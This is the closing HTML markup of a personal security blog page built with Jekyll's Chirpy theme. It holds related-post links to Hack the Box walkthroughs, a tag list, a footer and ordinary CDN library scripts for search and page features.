src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Cache/"><div class="card-body"> <em class="timeago small" data-ts="1593885600" > 2020-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cache</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Linux machine Cache. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1585332000" > 2020-03-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - OpenAdmin</h3><div class="text-muted small"><p> This write-up is an attempt to show my process of achieving root in the HackTheBox machine OpenAdmin. These HTB writeups have been migrated from a standalone repository for ease of access. Ho...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Traceback/"><div class="card-body"> <em class="timeago small" data-ts="1588010400" > 2020-04-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Traceback</h3><div class="text-muted small"><p> This is my write up for the HackTheBox Linux machine Traceback. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Sauna/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Sauna</p></a> <a href="/posts/HTB-Remote/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Remote</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
